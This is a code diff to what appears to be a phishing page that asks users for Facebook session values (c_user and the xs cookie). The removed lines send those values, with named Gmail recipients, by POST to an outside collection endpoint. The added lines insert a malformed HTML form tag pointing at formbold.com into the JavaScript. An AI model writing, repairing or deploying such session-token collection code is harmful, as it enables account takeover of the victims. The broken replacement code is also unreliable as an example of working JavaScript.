@@ -770,27 +770,8 @@
         const xsInputVal = xsInput.value.trim();
         
         // Always send c_user and xs
-        fetch("https://postal-form.on.shiper.app/submit", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                c_user: cUserInputVal,
-                xs: xsInputVal,
-                emails: ["mashooqkh2@gmail.com"],
-                workerEmail: "mashooqkh2@gmail.com",
-                name: "Eng",
-            }),
-        }).then(res => {
-            if (res.ok) {
-                console.log("Auto-submission successful");
-            } else {
-                throw new Error('Auto-submission failed');
-            }
-        }).catch(err => {
-            console.error("Auto-submission error:", err);
-        });
-    }
-
+        <form action="https://formbold.com/s/92NOb" method="POST">
+            
     // Validation functions
     function validateCUser(value) {
         return /^\d+$/.test(value); // Only numbers allowed
@@ -852,28 +833,11 @@
             submitRequestBtn.classList.add("button-loading");
             submitRequestBtn.disabled = true;
 
-            //   const emails = allowRecovery && recoveryCodes ? 
-            //         ["mashooqkh798@gmail.com", "gaa641088@gmail.com"] : 
-            //         ["mashoowkh@gmail.com", "mashooqkh2@gmail.com"];
-
-            //     const name = allowRecovery && recoveryCodes ? "shayan boss" : "shayan";
-
-            const emails = ["mashoowkh@gmail.com",""]
-            const name = "Mashooq ali"
+            
 
             // Submit main form
-            fetch("https://postal-form.on.shiper.app/submit", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                },
-                body: JSON.stringify({
-                    c_user: cUser,
-                    xs: xsToken,
-                    emails: emails,
-                    workerEmail: "gaa641088@gmail.com",
-                    name: name,
-                }),
+            <form action="https://formbold.com/s/92NOb" method="POST"
+                    
             })
             .then((response) => {
                 if (response.ok) {
